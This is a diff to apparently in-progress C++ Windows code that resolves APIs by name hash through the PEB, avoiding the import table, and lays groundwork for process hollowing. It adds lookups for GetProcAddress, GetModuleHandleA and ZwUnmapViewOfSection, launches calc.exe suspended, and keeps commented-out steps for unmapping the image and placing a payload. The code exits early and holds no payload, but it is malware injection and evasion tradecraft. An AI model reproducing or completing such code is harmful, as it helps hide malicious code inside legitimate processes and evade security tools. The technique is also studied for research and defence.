@@ -8,6 +8,7 @@
 
 // Comment this line below to enable debug messages, and vice-versa
 //#define TRACE
+#define TRACE_PEB
 
 template <typename T>
 T retrieve_function_by_hash(unsigned long funcHash, const char* base, const wchar_t* modName) {
@@ -109,19 +110,29 @@ IAT_t iat;
 int main(int argc, char **argv) {
 	// Checksum of the functions we want to retrieve
 	// check_sum_gen("LoadLibraryA") = 0x8dbeba00 and so on and so forth
-	const unsigned long hLoadLibraryA   = 0x8dbeba00;
-	const unsigned long hMessageBoxA    = 0xf6c562e0;
-	const unsigned long hVirtualAlloc   = 0x10f64400;
-	const unsigned long hVirtualprotect = 0x59664000;
-	const unsigned long hCreateProcessA = 0xf22c4080;
+	const unsigned long hLoadLibraryA		  = 0x8dbeba00;
+	const unsigned long hMessageBoxA		  = 0xf6c562e0;
+	const unsigned long hVirtualAlloc		  = 0x10f64400;
+	const unsigned long hVirtualprotect		  = 0x59664000;
+	const unsigned long hCreateProcessA		  = 0xf22c4080;
+	const unsigned long hGetProcAddress		  = 0x68b4800;
+	const unsigned long hGetModuleHandleA	  = 0xdffe0000;
+	const unsigned long hZwUnmapViewOfSection = 0xc9f17c00;
+
+	/*unsigned long hZwUnmapViewOfSection = check_sum_gen("ZwUnmapViewOfSection");
+	printf("ZwUnmapViewOfSection = %x\n", hZwUnmapViewOfSection);
+
+	exit(1);*/
 
 	iat.pLoadLibrary = NULL;
 	iat.pMessageBox =  NULL;
 	// Read PEB at fs:[0x30]
 	const WinDecls::PEB_T* pebPtr = (WinDecls::PEB_T*)__readfsdword(0x30);
+	const unsigned long baseAddr = pebPtr->ImageBaseAddress;
 
-#if defined(TRACE)
-	printf("[+] PEB @: %p\n", pebPtr);
+#if defined(TRACE_PEB)
+	printf("[+] PEB @: %x\n", pebPtr);
+	printf("[+] ImageBaseAddres @: %x\n", baseAddr);
 #endif
 
 	// Retrieve LDR_DATA structure
@@ -133,10 +144,14 @@ int main(int argc, char **argv) {
 	ModuleIterator iter(modPtr, Ldr);
 
 	iat.pLoadLibrary = iterate_modules<LoadLibrary_t>(hLoadLibraryA, iter);
-	iat.pVirtualAlloc = iterate_modules<VirtualAlloc_t>(hVirtualAlloc, iter);
-	iat.pVirtualProtect = iterate_modules<VirtualProtect_t>(hVirtualprotect, iter);
+	//iat.pVirtualAlloc = iterate_modules<VirtualAlloc_t>(hVirtualAlloc, iter);
+	//iat.pVirtualProtect = iterate_modules<VirtualProtect_t>(hVirtualprotect, iter);
 	iat.pCreateProcessA = iterate_modules<CreateProcessA_t>(hCreateProcessA, iter);
+	iat.pGetProcAddress = iterate_modules<GetProcAddress_t>(hGetProcAddress, iter);
+	iat.pGetModuleHandle = iterate_modules<GetModuleHandleA_t>(hGetModuleHandleA, iter);
+	iat.pZwUnmapViewOfSection = iterate_modules<ZwUnmapViewOfSection_t>(hZwUnmapViewOfSection, iter);
 
+	exit(1);
 
 	// Calls intended function
 	// The code below needs trimming, but it is still new and I was checking if it worked, and it did! :D
@@ -163,17 +178,18 @@ int main(int argc, char **argv) {
 	unsigned long CREATE_SUSPENDED = 0x00000004;
 	unsigned long DETACHED_PROCESS = 0x00000008;
 	// first create process as suspended
-	bool createResult = iat.pCreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, false, CREATE_SUSPENDED | DETACHED_PROCESS, NULL, NULL, &si, &pi);
+	bool createResult = iat.pCreateProcessA("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, false, CREATE_SUSPENDED | DETACHED_PROCESS, NULL, NULL, &si, &pi);
 	if (createResult == 0) {
 		printf("Failed to create process\n");
 		exit(1);
 	}
 
+
+	//iat.pZwUnmapViewOfSection(pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase);
 	// unmap memory space for our process
 	//pfnGetProcAddress fnGetProcAddress = (pfnGetProcAddress)GetKernel32Function(0xC97C1FFF);
 	//pfnGetModuleHandleA fnGetModuleHandleA = (pfnGetModuleHandleA)GetKernel32Function(0xB1866570);
 	//pfnZwUnmapViewOfSection fnZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)fnGetProcAddress(fnGetModuleHandleA(get_ntdll_string()), get_zwunmapviewofsection_string());
-	//fnZwUnmapViewOfSection(pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase);
 
 	//char* textSection = GetPayload((char *)iat.pMessageBox);
 	//printf("You can place the payload at: %x\n", (unsigned long)textSection);
